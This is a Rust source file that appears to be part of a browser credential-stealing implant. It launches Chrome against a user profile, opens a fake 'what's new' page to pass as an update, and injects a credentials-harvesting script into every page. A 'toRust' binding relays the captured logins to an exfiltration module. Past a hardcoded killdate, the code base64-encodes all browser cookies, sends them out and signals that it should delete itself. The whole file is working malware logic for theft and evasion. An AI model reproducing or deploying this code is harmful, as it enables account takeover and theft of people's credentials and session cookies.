use futures::StreamExt;
use tokio::time::{sleep, Duration};
use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine};
use chromiumoxide::{
    error::Result,
    browser::{Browser, BrowserConfig},
    cdp::{
        browser_protocol::{
            page::AddScriptToEvaluateOnNewDocumentParams,
            target::TargetId,
            network::Cookie
        },
        js_protocol::runtime::{EventBindingCalled, AddBindingParams},
    },
};

use std::{
    path::PathBuf,
    collections::HashSet,
};

pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error::Error>> {
    let (mut browser, mut handler) = Browser::launch(
            BrowserConfig::builder()
            .with_head()
            .disable_default_args()
            .user_data_dir(&junc_path)
            .arg("--no-startup-window")
            .viewport(None)
            .build()?
        ).await?;

    let _ = tokio::spawn(async move { while let Some(_) = handler.next().await {} });

    let page : chromiumoxide::Page;
    #[cfg(feature = "debug")]
    println!("[*] Retrieving cookies...");
    let cookies = browser.get_cookies().await?;

    if cookies.is_empty() {
        // Open page for whats new (simulate update)
        page = browser.new_page("https://developer.chrome.com/new").await?;
    } else {
        page = browser.new_page("chrome://newtab").await?;
    }

    #[cfg(feature = "debug")]
    println!("[*] Checking killdate...");
    let current_timestamp = page.evaluate("Math.floor(Date.now() / 1000)").await?.into_value::<u64>()?;
    let killdate_timestamp: u64 = env!("KILLDATE_TIMESTAMP").parse()?;

    // Compare the timestamps
    let delete_self: bool = current_timestamp > killdate_timestamp;

    // Lookup table to keep track of pages already injected.
    let mut injected_pages: HashSet<TargetId> = HashSet::new();

    #[cfg(feature = "debug")]
    println!("[*] Monitoring pages...");
    loop {
        let pages = browser.pages().await?;

        // If the number of pages is empty, we close the browser
        if pages.is_empty() {
            break;
        }

        // A temporary set to keep track of the pages found in the current iteration.
        let mut current_pages = HashSet::new();

        // For each page
        for page in pages {
            let page_id = page.target_id().clone();
            current_pages.insert(page_id.clone());

            // Check if we have already injected the script into this page.
            if !injected_pages.contains(&page_id) {
                #[cfg(feature = "debug")]
                println!("[+] New page detected");

                #[cfg(feature = "debug")]
                println!("[+] Creating callback loop");
                let mut listener = page.event_listener::<EventBindingCalled>().await?;
                tokio::spawn(async move {
                    while let Some(event) = listener.next().await {
                        if event.name == "toRust" {
                            #[cfg(feature = "debug")] {
                                println!("[i] Received credentials");
                                println!("[*] Sending payload: {}", event.payload);
                            }
                            if let Err(_e) = crate::exfil::exfil_data(&event.payload).await {
                                #[cfg(feature = "debug")]
                                eprintln!("[!] Error: {}", _e);
                            }
                        }
                    }
                });

                #[cfg(feature = "debug")]
                println!("[+] Exposing binding 'fetchData' for page {:?}", page_id);
                page.execute(AddBindingParams::new("toRust")).await?;

                #[cfg(feature = "debug")]
                println!("[*] Injecting JS into page with ID: {:?}", page_id);
                page.execute(
                    AddScriptToEvaluateOnNewDocumentParams::builder()
                        .source(include_str!("js/credentials.js"))
                        .build()?,
                )
                .await?;

                injected_pages.insert(page_id);
            }
        }

        // Remove IDs of pages that are now closed.
        injected_pages.retain(|page_id| current_pages.contains(page_id));

        // Wait for a second before checking again
        sleep(Duration::from_secs(1)).await;
    }

    if delete_self {
        #[cfg(feature = "debug")]
        println!("[-] Current date is past killdate.");

        #[cfg(feature = "debug")]
        println!("[*] Retrieving cookies...");
        let cookies: Vec<Cookie> = browser.get_cookies().await?;
        browser.close().await?;
        browser.wait().await?;

        let cookies_json = serde_json::to_string(&cookies)?;
        let encoded_cookies = URL_SAFE_NO_PAD.encode(cookies_json.as_bytes());

        #[cfg(feature = "debug")]
        println!("[*] Sending cookies...");
        if let Err(_e) = crate::exfil::exfil_data(&encoded_cookies).await {
            #[cfg(feature = "debug")]
            eprintln!("[!] Error: {}", _e);
        }

        #[cfg(feature = "debug")]
        println!("[+] Done");

        Ok(delete_self)
    } else {
        #[cfg(feature = "debug")]
        println!("[+] Current date is not past killdate.");

        browser.close().await?;
        browser.wait().await?;

        Ok(delete_self)
    }
}
